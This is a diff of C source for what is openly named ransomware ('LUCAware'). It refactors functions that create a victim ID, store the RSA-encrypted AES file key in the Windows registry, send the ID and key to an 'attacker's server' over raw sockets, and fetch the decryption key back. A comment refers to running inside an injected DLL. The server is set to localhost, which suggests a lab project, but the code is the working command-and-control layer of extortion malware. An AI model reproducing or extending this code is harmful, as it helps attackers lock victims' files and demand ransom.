@@ -10,12 +10,16 @@
 #include "mbedtls/base64.h"
 
 #include "get_relative_path.h"
+#include "store_in_register.h"
 
-#define REG_PATH  "Software\\FunEncryptionApp"
-#define REG_VALUE "MyID"
+#pragma comment(lib, "ws2_32.lib")
 
-/* Generate victim ID using computer name and volume serial number */
-#include <windows.h>
+#define AES_KEY_SIZE 16           // 128-bit AES
+#define RSA_KEY_SIZE 256          // 2048-bit RSA
+#define REG_PATH "Software\\LUCAware"
+#define ID_VALUE_NAME "MyID"
+#define ENCRYPTED_KEY_NAME "EncryptedKey"
+#define DECRYPTION_KEY_NAME "DecryptionKey"
 
 WSADATA wsa;
 SOCKET sock;
@@ -68,148 +72,24 @@ int generate_victim_id(ULONGLONG *out_id)
     return 0;
 }
 
-
 int EnsureIDExists(void)
 {
-    HKEY hKey;
-    DWORD disposition;
+    storage_context_t ctx = { REG_PATH };
     ULONGLONG id;
-    DWORD size = sizeof(id);
-    DWORD type;
 
-    if (RegCreateKeyExA(
-            HKEY_CURRENT_USER,
-            REG_PATH,
-            0,
-            NULL,
-            0,
-            KEY_READ | KEY_WRITE,
-            NULL,
-            &hKey,
-            &disposition
-        ) != ERROR_SUCCESS)
-    {
+    /* If already exists, nothing to do */
+    if (load_qword(&ctx, ID_VALUE_NAME, &id) == 0)
+        return 1;
+
+    /* Generate new ID */
+    if (generate_victim_id(&id) != 0)
         return 0;
-    }
 
-    // Check if value already exists
-    if (RegQueryValueExA(
-            hKey,
-            REG_VALUE,
-            NULL,
-            &type,
-            (BYTE *)&id,
-            &size
-        ) == ERROR_SUCCESS && type == REG_QWORD)
-    {
-        RegCloseKey(hKey);
-        return 1; // already exists
-    }
-
-    // Generate new ID
-    if (generate_victim_id(&id) != 0) {
-        RegCloseKey(hKey);
+    /* Store it */
+    if (store_qword(&ctx, ID_VALUE_NAME, id) != 0)
         return 0;
-    }
 
-    RegSetValueExA(
-        hKey,
-        REG_VALUE,
-        0,
-        REG_QWORD,
-        (BYTE *)&id,
-        sizeof(id)
-    );
-
-    RegCloseKey(hKey);
     return 1;
-}
-
-int ReadID(ULONGLONG *target)
-{
-    if (!target) {
-        return 1;
-    }
-
-    HKEY hKey;
-    DWORD size = sizeof(*target);
-
-    if (RegOpenKeyExA(
-            HKEY_CURRENT_USER,
-            REG_PATH,
-            0,
-            KEY_READ,
-            &hKey
-        ) != ERROR_SUCCESS)
-    {
-        return 1;
-    }
-
-    if (RegGetValueA(
-            hKey,
-            NULL,
-            REG_VALUE,
-            RRF_RT_REG_QWORD,
-            NULL,
-            target,
-            &size
-        ) != ERROR_SUCCESS)
-    {
-        RegCloseKey(hKey);
-        return 1;
-    }
-
-    RegCloseKey(hKey);
-    return 0;
-}
-
-/* Read the encrypted key file */
-int read_encrypted_key_file(const char *key_file, 
-                                    unsigned char **key_data, 
-                                    size_t *key_size) {
-    long file_size = 0;
-
-    if (!key_file || !key_data || !key_size) {
-        fprintf(stderr, "Invalid parameters\n");
-        return -1;
-    }
-    
-    // open file
-    FILE *file = fopen(key_file, "rb");
-    if (!file) {
-        fprintf(stderr, "Failed to open file\n");
-        return -1;
-    }
-    
-    // get file size
-    fseek(file, 0, SEEK_END);
-    file_size = ftell(file);
-    
-    if (file_size == 0) {
-        fclose(file);
-        fprintf(stderr, "File is empty\n");
-        return -1;
-    }
-    
-    // allocate memory
-    unsigned char *file_data = malloc(file_size);
-    
-    // read file
-    fseek(file, 0, SEEK_SET); // go back to beginning as previously the pointer was moved
-    if (fread(file_data, 1, file_size, file) != file_size) {
-        free(file_data);
-        fclose(file);
-        fprintf(stderr, "Failed to read file\n");
-        return -1;
-    }
-    
-    fclose(file);
-    
-    // return key and its size
-    *key_data = file_data;
-    *key_size = file_size;
-    
-    return 0;
 }
 
 /* Convert binary data to base64 as we will send key to the attacker's server in a JSON */
@@ -263,7 +143,7 @@ int ensure_web_setup() {
     // setup server address
     server.sin_family = AF_INET;
     server.sin_port = htons(8000);
-    server.sin_addr.s_addr = inet_addr("127.0.0.1"); // localhost
+    server.sin_addr.s_addr = inet_addr("127.0.0.1"); 
 
     return 0;
 }
@@ -273,97 +153,60 @@ void web_cleanup() {
     WSACleanup();
 }
 
-/* Send victim data to attacker's server */
-int send_to_server(ULONGLONG id, const char *encrypted_key) {
-    
-    // validate inputs
-    if (!encrypted_key) {
+int get_or_create_victim_id(ULONGLONG *id)
+{
+    if (!EnsureIDExists())
         return -1;
-    }
-    
-    // Max length of unsigned 64-bit integer is 20 digits
-    char id_str[21];
-    _ui64toa_s(id, id_str, sizeof(id_str), 10);
 
-    size_t json_size =
-        strlen("{\"victim_id\":, \"encrypted_key\":\"\"}") +
-        strlen(id_str) +
-        strlen(encrypted_key) + 1;
+    storage_context_t ctx = { REG_PATH };
+    return load_qword(&ctx, ID_VALUE_NAME, id);
+}
 
-    char *json = malloc(json_size);
-    if (!json) {
+int get_encrypted_aes_key(unsigned char *buf, size_t len)
+{
+    storage_context_t ctx = { REG_PATH };
+    return load_value(&ctx, ENCRYPTED_KEY_NAME, buf, len);
+}
+
+int store_aes_key(const unsigned char *buf, size_t len)
+{
+    storage_context_t ctx = { REG_PATH };
+    return store_value(&ctx, DECRYPTION_KEY_NAME, buf, len);
+}
+
+int http_post_json(const char *host, int port, const char *path, const char *json)
+{
+    if (ensure_web_setup() != 0)
         return -1;
-    }
 
-    snprintf(json, json_size,
-             "{\"victim_id\":%s, \"encrypted_key\":\"%s\"}",
-             id_str, encrypted_key);
-
-    /* Sending the API request using raw sockets as external libraries were harder
-     * to statically link and WinHTTP failed in the injected dll context (error 5023). */
-    
-    // Setup web environment
-    if (ensure_web_setup() != 0) {
-        free(json);
-        web_cleanup();
-        return -1;
-    }
-    
-    // connect to server
     if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
-        free(json);
         web_cleanup();
         return -1;
     }
-    
-    // build HTTP POST request manually
-    size_t request_size = strlen("POST /api/keys HTTP/1.1\r\nHost: 127.0.0.1:8000\r\nContent-Type: application/json\r\nContent-Length: ") +
-                          strlen(json) + 20 + strlen("\r\n\r\n") + 1;
-    char *request = malloc(request_size);
-    if (!request) {
-        closesocket(sock);
-        WSACleanup();
-        free(json);
-        return -1;
-    }
-    
-    snprintf(request, request_size,
-             "POST /api/keys HTTP/1.1\r\n"
-             "Host: 127.0.0.1:8000\r\n"
+
+    char request[1024];
+    snprintf(request, sizeof(request),
+             "POST %s HTTP/1.1\r\n"
+             "Host: %s:%d\r\n"
              "Content-Type: application/json\r\n"
              "Content-Length: %zu\r\n"
              "\r\n"
              "%s",
-             strlen(json), json);
-    
-    // send HTTP request
+             path, host, port, strlen(json), json);
+
     int sent = send(sock, request, strlen(request), 0);
-    
-    // read response
+
     char buffer[1024];
     recv(sock, buffer, sizeof(buffer), 0);
-    
-    // cleanup
+
     web_cleanup();
-    free(request);
-    free(json);
-    
-    // check if send was successful
-    if (sent > 0) {
-        return 0;  // success
-    } else {
-        return -1; // failure
-    }
+    return (sent > 0) ? 0 : -1;
 }
 
-int get_from_server_and_save_key(ULONGLONG id) {
-    char id_str[21];
-    _ui64toa_s(id, id_str, sizeof(id_str), 10);
-
-    if (ensure_web_setup() != 0) {
-        web_cleanup();
+int http_get(const char *host, int port, const char *path, unsigned char *out_buf, size_t expected_size)
+{
+    if (ensure_web_setup() != 0)
         return -1;
-    }
 
     if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
         web_cleanup();
@@ -372,24 +215,21 @@ int get_from_server_and_save_key(ULONGLONG id) {
 
     char request[256];
     snprintf(request, sizeof(request),
-             "GET /api/key/%s HTTP/1.1\r\n"
-             "Host: 127.0.0.1:8000\r\n"
+             "GET %s HTTP/1.1\r\n"
+             "Host: %s:%d\r\n"
              "\r\n",
-             id_str);
+             path, host, port);
 
-    if (send(sock, request, (int)strlen(request), 0) <= 0) {
+    if (send(sock, request, strlen(request), 0) <= 0) {
         web_cleanup();
         return -1;
     }
 
     char buffer[256];
-    int total = 0;
-    int headers_end = 0;
+    int total = 0, headers_end = 0, body_received = 0;
     char *body_start = NULL;
-    char aes_key[16];
-    int body_received = 0;
 
-    while (body_received < 16) {
+    while (body_received < expected_size) {
         int r = recv(sock, buffer + total, sizeof(buffer) - total, 0);
         if (r <= 0) {
             web_cleanup();
@@ -398,106 +238,80 @@ int get_from_server_and_save_key(ULONGLONG id) {
         total += r;
 
         if (!headers_end) {
+            if (memcmp(buffer, "HTTP/1.1 200", 12) != 0 &&
+                memcmp(buffer, "HTTP/1.0 200", 12) != 0) {
+                web_cleanup();
+                return -1;
+            }
+
             body_start = strstr(buffer, "\r\n\r\n");
             if (body_start) {
                 headers_end = 1;
-                body_start += 4; // skip headers
+                body_start += 4;
 
-                // Copy any body bytes already received
                 int available = (buffer + total) - body_start;
-                if (available > 16) available = 16;
-                memcpy(aes_key, body_start, available);
+                if (available > expected_size) available = expected_size;
+                memcpy(out_buf, body_start, available);
                 body_received = available;
             }
         } else {
-            // Copy remaining body bytes
-            int to_copy = 16 - body_received;
+            int to_copy = expected_size - body_received;
             if (to_copy > r) to_copy = r;
-            memcpy(aes_key + body_received, buffer, to_copy);
+            memcpy(out_buf + body_received, buffer, to_copy);
             body_received += to_copy;
         }
 
-        // Reset buffer offset for next recv
         total = 0;
     }
 
-    char path[MAX_PATH];
-    if (get_relative_path(path, sizeof(path), "decryption_key.bin") != 0) {
-        web_cleanup();
-        return -1;
-    }
-
-    FILE *fp = fopen(path, "wb");
-    if (!fp) {
-        web_cleanup();
-        return -1;
-    }
-
-    fwrite(aes_key, 1, 16, fp);
-    fclose(fp);
     web_cleanup();
-
     return 0;
 }
 
-
-
-/* Send encrypted key to attacker's server */
-int send_key_to_attacker(const char *key_file) {
-
+int send_key_to_attacker(void)
+{
     ULONGLONG victim_id;
-
-    // Ensure ID exists (generate if missing)
-    if (!EnsureIDExists()) {
+    if (get_or_create_victim_id(&victim_id) != 0)
         return -1;
-    }
 
-    // Read the ID
-    if (ReadID(&victim_id) != 0) {
+    unsigned char key_data[RSA_KEY_SIZE];
+    if (get_encrypted_aes_key(key_data, sizeof(key_data)) != 0)
         return -1;
-    }
 
-    // read encrypted key from file
-    unsigned char *key_data = NULL;
-    size_t key_size = 0;
-    if (read_encrypted_key_file(key_file, &key_data, &key_size) != 0) {
-        return -1;
-    }
-
-    // encode key to base64
     char *base64_key = NULL;
     size_t base64_len = 0;
-    if (base64_encode(key_data, key_size, &base64_key, &base64_len) != 0) {
-        free(key_data); // free key data if encoding fails
+    if (base64_encode(key_data, sizeof(key_data), &base64_key, &base64_len) != 0)
         return -1;
-    }
 
-    // send to attacker's server
-    int result = send_to_server(victim_id, base64_key);
+    char json[512];
+    snprintf(json, sizeof(json),
+             "{\"victim_id\":%llu, \"encrypted_key\":\"%s\"}",
+             victim_id, base64_key);
 
-    // cleanup
-    free(key_data);
+    int result = http_post_json("127.0.0.1", 8000, "/api/keys", json);
+
     free(base64_key);
-
     return result;
 }
 
-int get_decryption_key_from_attacker() {
+int get_decryption_key_from_attacker(void)
+{
     ULONGLONG victim_id;
-
-    // Ensure ID exists (generate if missing)
-    if (!EnsureIDExists()) {
+    if (get_or_create_victim_id(&victim_id) != 0)
         return -1;
-    }
 
-    // Read the ID
-    if (ReadID(&victim_id) != 0) {
-        return -1;
-    }
+    unsigned char aes_key[AES_KEY_SIZE];
 
-    if ((get_from_server_and_save_key(victim_id) != 0)) {
+    char path[128];
+    snprintf(path, sizeof(path),
+             "/api/key/%llu",
+             (unsigned long long)victim_id);
+
+    if (http_get("127.0.0.1", 8000, path, aes_key, AES_KEY_SIZE) != 0)
         return -1;
-    }
+
+    if (store_aes_key(aes_key, AES_KEY_SIZE) != 0)
+        return -1;
 
     return 0;
 }
